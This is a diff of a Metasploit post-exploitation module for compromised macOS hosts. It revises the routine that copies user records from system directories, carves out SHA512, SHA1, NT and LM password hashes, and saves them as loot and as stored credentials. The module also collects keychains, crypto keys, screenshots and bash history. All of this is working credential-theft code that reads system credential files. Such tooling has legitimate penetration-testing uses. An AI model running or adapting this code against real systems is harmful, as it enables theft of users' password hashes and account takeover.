@@ -5,8 +5,8 @@
 ##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Post
 		enum_accounts(log_folder, ver_num)
 		get_crypto_keys(log_folder)
 		screenshot(log_folder, ver_num)
-		dump_hash(log_folder,ver_num) if running_root
+		dump_hash(ver_num) if running_root
 		dump_bash_history(log_folder)
 		get_keychains(log_folder)
 
@@ -474,12 +474,10 @@ class Metasploit3 < Msf::Post
 		print_status("Dumping Hashes")
 		users = []
 		nt_hash = nil
-		host,port = session.tunnel_peer.split(':')
+		host = session.session_host
 
 		# Path to files with hashes
-		nt_file = ::File.join(log_folder,"nt_hash.txt")
-		lm_file = ::File.join(log_folder,"lm_hash.txt")
-		sha1_file = ::File.join(log_folder,"sha1_hash.txt")
+		sha1_file = ""
 
 		# Check if system is Lion if not continue
 		if ver_num =~ /10\.(7)/
@@ -496,12 +494,12 @@ class Metasploit3 < Msf::Post
 					next if p =~ /^daemon|root|nobody/
 
 					# Turn profile plist in to XML format
-					cmd_exec("cp /private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
-					cmd_exec("plutil -convert xml1 /tmp/#{p.chomp}")
-					file = cmd_exec("cat /tmp/#{p.chomp}")
+					cmd_exec("cp","/private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
+					cmd_exec("plutil","-convert xml1 /tmp/#{p.chomp}")
+					file = cmd_exec("cat","/tmp/#{p.chomp}")
 
 					# Clean up using secure delete overwriting and zeroing blocks
-					cmd_exec("/usr/bin/srm -m -z /tmp/#{p.chomp}")
+					cmd_exec("/usr/bin/srm","-m -z /tmp/#{p.chomp}")
 
 					# Process XML Plist into a usable hash
 					plist_values = read_ds_xml_plist(file)
@@ -510,38 +508,31 @@ class Metasploit3 < Msf::Post
 					plist_values['ShadowHashData'].join("").unpack('m')[0].each_byte do |b|
 						hash_decoded << sprintf("%02X", b)
 					end
-					user = plist_values['name']
+					user = plist_values['name'].join("")
 
 					# Check if NT HASH is present
 					if hash_decoded =~ /4F1010/
-						nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)
+						nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0]
 					end
 
 					# Carve out the SHA512 Hash, the first 4 bytes is the salt
 					sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
 
 					print_status("SHA512:#{user}:#{sha512}")
-					file_local_write(sha1_file,"#{user}:#{sha512}")
-					report_auth_info(
-						:host   => host,
-						:port   => 0,
-						:sname  => 'sha512',
-						:user   => user,
-						:pass   => sha512,
-						:active => true
-					)
+					sha1_file << "#{user}:#{sha512}\n"
+
 					# Reset hash value
 					sha512 = ""
 
 					if nt_hash
 						print_status("NT:#{user}:#{nt_hash}")
-						file_local_write(nt_file,"#{user}:#{nt_hash}")
+						print_status("Credential saved in database.")
 						report_auth_info(
 							:host   => host,
 							:port   => 445,
 							:sname  => 'smb',
 							:user   => user,
-							:pass   => nt_hash,
+							:pass   => "AAD3B435B51404EE:#{nt_hash}",
 							:active => true
 						)
 
@@ -552,6 +543,9 @@ class Metasploit3 < Msf::Post
 					hash_decoded = ""
 				end
 			end
+			# Save pwd file
+			upassf = store_loot("osx.hashes.sha512", "text/plain", session, sha1_file, "unshadowed_passwd.pwd", "OSX Unshadowed SHA512 Password File")
+			print_good("Unshadowed Password File: #{upassf}")
 
 			# If system was lion and it was processed nothing more to do
 			return
@@ -566,13 +560,9 @@ class Metasploit3 < Msf::Post
 		# Process each user
 		users.each do |user|
 			if ver_num =~ /10\.(6|5)/
-
 				guid = cmd_exec("/usr/bin/dscl", "localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
-
 			elsif ver_num =~ /10\.(4|3)/
-
 				guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
-
 			end
 
 			# Extract the hashes
@@ -580,46 +570,40 @@ class Metasploit3 < Msf::Post
 			nt_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
 			lm_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
 
-
 			# Check that we have the hashes and save them
 			if sha1_hash !~ /00000000000000000000000000000000/
 				print_status("SHA1:#{user}:#{sha1_hash}")
-				file_local_write(sha1_file,"#{user}:#{sha1_hash}")
-				report_auth_info(
-					:host   => host,
-					:port   => 0,
-					:sname  => 'sha1',
-					:user   => user,
-					:pass   => sha1_hash,
-					:active => true
-				)
+				sha1_file << "#{user}:#{sha1_hash}"
 			end
 
 			if nt_hash !~ /000000000000000/
 				print_status("NT:#{user}:#{nt_hash}")
-				file_local_write(nt_file,"#{user}:#{nt_hash}")
+				print_status("Credential saved in database.")
 				report_auth_info(
 					:host   => host,
 					:port   => 445,
 					:sname  => 'smb',
 					:user   => user,
-					:pass   => nt_hash,
+					:pass   => "AAD3B435B51404EE:#{nt_hash}",
 					:active => true
 				)
 			end
 			if lm_hash !~ /0000000000000/
 				print_status("LM:#{user}:#{lm_hash}")
-				file_local_write(lm_file,"#{user}:#{lm_hash}")
+				print_status("Credential saved in database.")
 				report_auth_info(
 					:host   => host,
 					:port   => 445,
 					:sname  => 'smb',
 					:user   => user,
-					:pass   => lm_hash,
+					:pass   => "#{lm_hash}:",
 					:active => true
 				)
 			end
 		end
+		# Save pwd file
+		upassf = store_loot("osx.hashes.sha1", "text/plain", session, sha1_file, "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
+		print_good("Unshadowed Password File: #{upassf}")
 	end
 
 	# Download configured Keychains
